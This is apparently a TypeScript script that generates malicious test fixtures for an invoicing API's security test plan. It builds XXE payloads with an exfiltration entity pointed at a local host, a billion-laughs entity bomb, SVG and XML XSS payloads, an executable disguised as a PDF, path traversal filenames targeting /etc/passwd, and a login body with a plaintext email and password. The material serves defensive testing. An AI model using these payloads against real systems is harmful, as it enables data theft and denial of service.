// Generador de fixtures maliciosos para bateria de pruebas SAST TEST-PLAN-API-SAST.md
// items 2.4, 2.5, 2.6, 2.7, 2.9, 2.10, 2.11, 2.12.
// Archivos se guardan en test-fixtures/sast/payloads/. Cada fixture incluye un
// companion MANIFEST.md con: nombre, proposito (test id), tipo de contenido,
// tamanio, y como usarlo (ruta, method, campo del form/json).
import fs from 'fs'
import path from 'path'

const DIR = path.resolve(process.cwd(), 'test-fixtures', 'sast', 'payloads')
fs.mkdirSync(DIR, { recursive: true })
const files: Array<{ file: string, bytes: number, purpose: string, endpoint: string, notes: string }> = []

const META: string[] = [
  '# MANIFEST: fixtures maliciosos / size-bomb / path-traversal (SAST API smoke)',
  'Generado por scripts/build-sast-payloads.mts',
  `Fecha: ${new Date().toISOString()}`,
  '',
  '| Archivo (test-fixtures/sast/payloads/) | Tamanio | Proposito (test id) | Consumirse en |',
  '|---|---|---|---|'
]

// 2.4 XXE local-entity + external-entity
{
  const xxe = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE cfdi:Comprobante [
  <!ENTITY xxeLocal "INJECTED_XXE_LOCAL">
  <!ENTITY % xxeExt "<!ENTITY xxeExfil SYSTEM 'http://127.0.0.1:9090/exfil?h=XXE_SHOULD_BE_BLOCKED'>">
  %xxeExt;
]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0"
  Folio="XXE-0001" Serie="XXE"
  SubTotal="1000.00" Total="1160.00"
  Moneda="MXN" FormaPago="01" MetodoPago="PUE"
  LugarExpedicion="06000" TipoDeComprobante="I"
  Exportacion="01" Sello="(omitido)" Certificado="(omitido)" NoCertificado="(omitido)"
  Fecha="${new Date().toISOString()}">
  <cfdi:Emisor Rfc="ODE8604257UA" Nombre="XXE TEST" RegimenFiscal="601"/>
  <cfdi:Receptor Rfc="XAXX010101000" Nombre="&xxeLocal;" DomicilioFiscalReceptor="06000" RegimenFiscalReceptor="612" UsoCFDI="G01"/>
  <cfdi:Conceptos>
    <cfdi:Concepto ClaveProdServ="01010101" Cantidad="1" ClaveUnidad="H87" Descripcion="&xxeExfil;" ValorUnitario="1000" Importe="1000" ObjetoImp="02">
      <cfdi:Impuestos>
        <cfdi:Traslados><cfdi:Traslado Base="1000" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="160"/></cfdi:Traslados>
      </cfdi:Impuestos>
    </cfdi:Concepto>
  </cfdi:Conceptos>
  <cfdi:Impuestos TotalImpuestosTrasladados="160"/>
</cfdi:Comprobante>`
  const p = path.join(DIR, 'payload-2.4-xxe-injection.xml')
  fs.writeFileSync(p, xxe, 'utf8')
  files.push({ file: path.basename(p), bytes: xxe.length, purpose: 'API-01.2 XXE, API-02.3 PDF XXE, API-09.2 import XXE', endpoint: 'POST /api/invoices/parse, POST /api/provider/cfdi/report, POST /api/invoices/:uuid/pdf, POST /api/external/v1/import', notes: 'entidad local (nombre receptor) + external DTD que intenta exfiltrar a 127.0.0.1:9090. Debe ser rechazado (xxe blocked, DTD forbidden, o parseo solo por tags).' })
}

// 2.5 Billion laughs
{
  const lol = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`
  const p = path.join(DIR, 'payload-2.5-billion-laughs.xml')
  fs.writeFileSync(p, lol, 'utf8')
  files.push({ file: path.basename(p), bytes: lol.length, purpose: 'API-01.3 entity expansion DoS / memory / parse timeout', endpoint: 'POST /api/invoices/parse, POST /api/external/v1/import', notes: 'debe fallar con maxOccurs / DTD off o maxEntityExpansion, NO colgar el worker.' })
}

// 2.6 strict extra field (json strict fields for POST /api/auth/login body malicioso; xml extra namespaces)
{
  // Extra field JSON: login endpoint Zod schema no tiene 'strip()' → se espera unmatch se ignore, nunca 500
  const extra = JSON.stringify({ email: 'rtorreh@itcomplements.com', password: 'Holamundo1?', totallyUnexpectedField: Array.from({ length: 2000 }).map(() => 'X').join('') }, null, 2)
  const p = path.join(DIR, 'payload-2.6-strict-extra-field-login.json')
  fs.writeFileSync(p, extra, 'utf8')
  files.push({ file: path.basename(p), bytes: extra.length, purpose: 'API-00.1 / strict-unknown-fields', endpoint: 'POST /api/auth/login  application/json; raw body', notes: 'debe responder 2xx/4xx normal, nunca 500. Schema Zod debe ignorar campos extra.' })
}
{
  // XML extra ns con tags estrictamente desconocidos
  const extraNs = `<?xml version="1.0" encoding="UTF-8"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" xmlns:evil="http://evil.local/sast" Version="4.0" Folio="EXT-001" Serie="S" SubTotal="1000" Total="1160" Moneda="MXN" FormaPago="01" MetodoPago="PUE" LugarExpedicion="06000" TipoDeComprobante="I" Exportacion="01" Fecha="${new Date().toISOString()}">
  <evil:InjectMe please="parse me" script="onerror&equals;alert(1)">&lt;img src=x onerror=alert(1) /&gt;</evil:InjectMe>
  <cfdi:Emisor Rfc="ODE8604257UA" Nombre="Strict Extra Test" RegimenFiscal="601"/>
  <cfdi:Receptor Rfc="XAXX010101000" Nombre="Publico General" DomicilioFiscalReceptor="06000" RegimenFiscalReceptor="612" UsoCFDI="G01"/>
  <cfdi:Conceptos>
    <cfdi:Concepto ClaveProdServ="01010101" Cantidad="1" ClaveUnidad="H87" Descripcion="Servicio" ValorUnitario="1000" Importe="1000" ObjetoImp="02">
      <cfdi:Impuestos><cfdi:Traslados><cfdi:Traslado Base="1000" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="160"/></cfdi:Traslados></cfdi:Impuestos>
    </cfdi:Concepto>
  </cfdi:Conceptos>
  <cfdi:Impuestos TotalImpuestosTrasladados="160"/>
</cfdi:Comprobante>`
  const p = path.join(DIR, 'payload-2.6-strict-extra-namespace.xml')
  fs.writeFileSync(p, extraNs, 'utf8')
  files.push({ file: path.basename(p), bytes: extraNs.length, purpose: 'API-01 strict schema / unknown elements', endpoint: 'POST /api/invoices/parse, POST /api/provider/cfdi/report, POST /api/external/v1/import', notes: 'tags desconocidos de namespace extra evil deben ignorarse o rechazarse, nunca 500 ni script ejecucion.' })
}

// 2.7 size overflow 50MB (XML / CSV / body bruto) — lo hacemos stream de zeros + header trailer para no ocupar RAM
{
  const p = path.join(DIR, 'payload-2.7-size-overflow-50MB.xml')
  const header = '<?xml version="1.0"?><OversizeCFDI Version="4.0"><Peso>'
  const trailer = '</Peso></OversizeCFDI>'
  const TARGET = 50 * 1024 * 1024 // 50 MB
  const CHUNK = 1024 * 1024
  fs.writeFileSync(p, header, 'utf8')
  const bodyLen = TARGET - header.length - trailer.length
  const fd = fs.openSync(p, 'a')
  const fill = Buffer.alloc(CHUNK, 0x41) // letra A, bytes imprimibles
  let written = 0
  while (written < bodyLen) {
    const w = Math.min(CHUNK, bodyLen - written)
    fs.writeSync(fd, w === CHUNK ? fill : fill.slice(0, w), 0, w)
    written += w
  }
  fs.writeSync(fd, trailer)
  fs.closeSync(fd)
  const bytes = fs.statSync(p).size
  files.push({ file: path.basename(p), bytes, purpose: 'API-01.5 size-bomb 50MB / body limits', endpoint: 'POST /api/invoices/parse (multipart/form-data file=body), POST /api/external/v1/import', notes: 'debe fallar 413 Payload Too Large o limite de multer/Next bodyParser antes de entrar a Zod / XML parser.' })
}
{
  const p = path.join(DIR, 'payload-2.7-size-overflow-50MB.json')
  const header = '{"bigField":"'
  const trailer = '"}'
  const TARGET = 50 * 1024 * 1024
  fs.writeFileSync(p, header, 'utf8')
  const bodyLen = TARGET - header.length - trailer.length
  const fd = fs.openSync(p, 'a')
  const fill = Buffer.alloc(Math.min(bodyLen, 1024 * 1024), 0x5a)
  let written = 0
  while (written < bodyLen) {
    const w = Math.min(fill.length, bodyLen - written)
    fs.writeSync(fd, fill, 0, w)
    written += w
  }
  fs.writeSync(fd, trailer)
  fs.closeSync(fd)
  files.push({ file: path.basename(p), bytes: fs.statSync(p).size, purpose: 'API-00.2 JSON body size 50MB', endpoint: 'cualquier JSON endpoint (ej. POST /api/auth/login con body enorme)', notes: 'debe fallar 413 antes de Zod.parse.' })
}

// 2.9 logo oversized 8MB (PNG fake header).
{
  const p = path.join(DIR, 'payload-2.9-logo-8MB.png')
  const pngSig = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
  fs.writeFileSync(p, pngSig)
  const fd = fs.openSync(p, 'a')
  const TARGET = 8 * 1024 * 1024 + 1
  const CHUNK = 1024 * 1024
  const fill = Buffer.alloc(CHUNK, 0x00)
  let written = pngSig.length
  while (written < TARGET) {
    const w = Math.min(CHUNK, TARGET - written)
    fs.writeSync(fd, fill, 0, w)
    written += w
  }
  fs.closeSync(fd)
  files.push({ file: path.basename(p), bytes: fs.statSync(p).size, purpose: 'API-10 logo / adjunto 8MB > limite', endpoint: 'PATCH /api/fiscal-entities/:id  multipart logo=<file>, PATCH /api/companies/:id logo=<file>', notes: 'debe retornar 413 (Payload Too Large) o 400 con mensaje explicito de tamanio maximo.' })
}
{
  const p = path.join(DIR, 'payload-2.9-logo-8MB.jpg')
  const jpgSig = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46])
  fs.writeFileSync(p, jpgSig)
  const fd = fs.openSync(p, 'a')
  const TARGET = 8 * 1024 * 1024 + 512
  const fill = Buffer.allocUnsafeSlow(Math.min(TARGET, 1024 * 1024))
  let written = jpgSig.length
  while (written < TARGET) {
    const w = Math.min(fill.length, TARGET - written)
    fs.writeSync(fd, fill, 0, w)
    written += w
  }
  fs.closeSync(fd)
  files.push({ file: path.basename(p), bytes: fs.statSync(p).size, purpose: 'API-10 logo JPG oversized > 8MB', endpoint: 'PATCH /api/fiscal-entities/:id / PATCH /api/companies/:id', notes: 'idem PNG.' })
}

// 2.10 PDF spoof MIME (Content-Type: application/pdf + fake magics + otros deceptions)
{
  // Real mini PDF que dice "SOY UN PDF PERO CONTENIDO NO ESPERADO", spoofed extension .pdf pero en realidad MIME application/pdf lo acepta; luego adjuntamos otros.
  const miniPdf = Buffer.from(
    '%PDF-1.4\n' +
    '1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n' +
    '2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n' +
    '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj\n' +
    '4 0 obj<</Length 59>>stream\n' +
    'BT /F1 12 Tf 50 720 Td (SPOOFED MIME: I am a real PDF but unexpected content) Tj ET\n' +
    'endstream endobj\n' +
    '5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\n' +
    'xref\n0 6\n0000000000 65535 f \n0000000009 00000 n \n0000000052 00000 n \n0000000101 00000 n \n0000000209 00000 n \n0000000317 00000 n \n' +
    'trailer<</Size 6/Root 1 0 R>>\n' +
    'startxref\n374\n%%EOF\n',
    'latin1'
  )
  const p1 = path.join(DIR, 'payload-2.10-pdf-spoof-mime-real-pdf.pdf')
  fs.writeFileSync(p1, miniPdf)
  files.push({ file: path.basename(p1), bytes: miniPdf.length, purpose: 'API-02.2 PDF spoof / MIME mismatch (PDF es válido pero campo Invoice no coincide)', endpoint: 'POST /api/invoices/:uuid/pdf | Body multipart name="file" archivo .pdf', notes: 'debe fallar con 400 / invalid-content, no 500 ni almacenarse.' })

  // Spoof extension: guardar un ejecutable de Windows (.exe) con extension .pdf y Content-Type: application/pdf
  const fakePdf = Buffer.concat([
    Buffer.from('MZ This is definitely an EXE pretending to be a PDF; look: %PDF-1.4 fake marker inside. This should trigger content-magic validation.', 'utf8'),
    Buffer.allocUnsafeSlow(2048).fill(0xcc)
  ])
  const p2 = path.join(DIR, 'payload-2.10-exe-renamed-to-pdf.pdf')
  fs.writeFileSync(p2, fakePdf)
  files.push({ file: path.basename(p2), bytes: fakePdf.length, purpose: 'API-02.2 MIME spoof: exe renombrado .pdf', endpoint: 'cualquier multipart upload que acepte .pdf / invoices file / mass-download zip adjunto', notes: 'debe bloquearse por magic bytes (MZ) no por Content-Type. 400 Malicious file type detected.' })

  // Spoof logo SVG con extension .png.
  const svg = `<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" width="1" height="1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">alert("SAST-XSS-SVG-LOGO")</script>
  <image href="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/>
</svg>`
  const p3 = path.join(DIR, 'payload-2.10-svg-spoofed-as-png.png')
  fs.writeFileSync(p3, svg, 'utf8')
  files.push({ file: path.basename(p3), bytes: svg.length, purpose: 'API-10.2 upload logo SVG + XSS renombrado .png', endpoint: 'PATCH /api/fiscal-entities/:id  multipart logo=<file>', notes: 'debe rechazarse por mime-magic (actualmente SVG xml con <script>) antes de guardarse en blob storage.' })
}

// 2.11 Path traversal samples (nombres de archivo con ../../../../windows/win.ini, unicode escapes, NUL byte)
{
  const TRAVERSAL_DIR = path.join(DIR, 'traversal-names')
  fs.mkdirSync(TRAVERSAL_DIR, { recursive: true })
  const samples: Array<[string, Buffer | string]> = [
    ['../../../../windows/win.ini.jpg', 'FFD8FFE0 content fake JPEG '.repeat(20)],
    ['....//....//....//....//etc/passwd.png', Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x00, 0x00, 0x00].concat(Array.from({ length: 64 }, () => 0x41)))],
    ['logo%2e%2e%2f%2e%2e%2fboot.ini', 'fake logo url-encoded slashes'],
    ['logo..%c0%af..%c0%afwindows%c0%afwin.ini.pdf', 'double-null-encoded slash'],
    ['logo\u0000../etc/passwd.xml', '<?xml version="1.0"?><x>nul byte in filename</x>'],
    ['com4.xml', 'reserved windows device name'],
    ['LPT1:.xml', 'reserved dos device with trailing dot']
  ]
  for (const [fname, body] of samples) {
    // Windows no permite slashes / NUL en nombres de archivo. Lo sustituimos por safeName y guardamos un MANIFEST interno con el NOMBRE PELIGROSO que el test debe enviar en el multipart.
    const safeName = 'pt-' + fname.replace(/[^a-zA-Z0-9._%\-]/g, '_')
    const bodyBuf = typeof body === 'string' ? Buffer.from(body, 'utf8') : Buffer.from(body as any)
    const target = path.join(TRAVERSAL_DIR, safeName)
    fs.writeFileSync(target, bodyBuf)
    const sidecar = target + '.meta.json'
    fs.writeFileSync(sidecar, JSON.stringify({
      testId: 'API-10.3 / API-01.6 path traversal',
      dangerousUploadNameField: fname,
      safeLocalPath: safeName,
      consumeAs: `multipart/form-data; campo = file, filename="${fname}" y bytes=${safeName}`,
      expected: 'servidor debe normalizar (path.basename, trim, strip nulls, remove reserved devices) y devolver 400 si no puede sanear. NUNCA guardar ../../ fuera de container.'
    }, null, 2), 'utf8')
    files.push({ file: path.relative(DIR, target), bytes: bodyBuf.length, purpose: `API-10.3/API-01.6 traversal (filename="${fname}")`, endpoint: 'PATCH /api/fiscal-entities/:id logo=file | POST /api/invoices parse file=file | POST /api/mass-downloads/:id/downloadZip?f=../../x', notes: `meta file: ${path.relative(DIR, sidecar)}; usar el filename peligroso en FormData, el body se sirve del archivo safeName.` })
  }
}

// 2.12 Oversized FIEL key 32KB y cer 16KB (exceden MAX_KEY_BYTES 8KB y MAX_CER_BYTES 10KB)
{
  const fiel = fs.readFileSync(path.join(path.dirname(DIR), 'fiel-dev', 'fiel-dev-valid.key'))
  const cer = fs.readFileSync(path.join(path.dirname(DIR), 'fiel-dev', 'fiel-dev-valid.cer'))
  const padTo = (src: Buffer, n: number): Buffer => Buffer.concat([src, Buffer.alloc(Math.max(0, n - src.length), 0x00)])
  const bigKey = padTo(fiel, 32 * 1024 + 1)
  const bigCer = padTo(cer, 16 * 1024 + 1)
  const pk = path.join(DIR, 'payload-08-key-32KB.key')
  const pc = path.join(DIR, 'payload-08-cer-16KB.cer')
  fs.writeFileSync(pk, bigKey)
  fs.writeFileSync(pc, bigCer)
  files.push({ file: path.basename(pk), bytes: bigKey.length, purpose: 'API-08.4 Oversized privateKey > 8KB (MAX_KEY_BYTES)', endpoint: 'POST /api/mass-downloads/credentials form-data privateKey=<file>', notes: 'debe fallar 400 / 413 sin crash.' })
  files.push({ file: path.basename(pc), bytes: bigCer.length, purpose: 'API-08.5 Oversized certificate > 10KB (MAX_CER_BYTES)', endpoint: 'POST /api/mass-downloads/credentials form-data certificate=<file>', notes: 'idem.' })
}

// Render manifest
for (const f of files) {
  META.push(`| \`${f.file}\` | ${f.bytes.toLocaleString('en-US')} | ${f.purpose} | ${f.endpoint} |`)
  META.push(`| | | _notes_ | ${f.notes.replace(/\|/g, '\\|')} |`)
}
fs.writeFileSync(path.join(DIR, 'MANIFEST.md'), META.join('\n') + '\n', 'utf8')

console.log(`=== ✅ SAST payloads creados en ${DIR} ===`)
for (const f of files) console.log(`  - ${f.file.padEnd(60)} ${String(f.bytes).padStart(12)} bytes  :: ${f.purpose}`)
console.log('Total fixtures:', files.length)
console.log('Manifest: ', path.join(DIR, 'MANIFEST.md'))
